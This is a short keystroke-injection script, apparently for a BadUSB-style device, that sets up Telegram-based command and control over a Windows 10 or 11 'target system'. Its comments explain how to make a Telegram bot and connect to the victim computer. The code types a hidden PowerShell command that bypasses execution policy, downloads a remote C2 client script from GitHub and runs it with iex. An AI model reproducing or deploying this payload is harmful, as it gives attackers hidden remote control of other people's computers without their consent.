
// Title: beigeworm's Telegram Command And Control.
// Author: @beigeworm
// Description: Using a Telegram Bot's Chat to Act as a Command and Control Platform.
// Target: Windows 10 and 11
// SETUP INSTRUCTIONS
// 1. visit https://t.me/botfather and make a bot.
// 2. add bot api to script.
// 3. search for bot in top left box in telegram and start a chat then type /start.
// 5. Run Script on target System
// 6. Check telegram chat for 'waiting to connect' message.
// 7. this script has a feature to wait until you start the session from telegram.
// 8. type in the computer name from that message into telegram bot chat to connect to that computer.
// 9. Replace TELEGRAM_BOT_API_TOKEN_HERE Below with your Telegram Bot API Token

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Ep Bypass -W H -C $tg='TELEGRAM_BOT_API_TOKEN_HERE'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex");
delay(500);
press("ENTER");
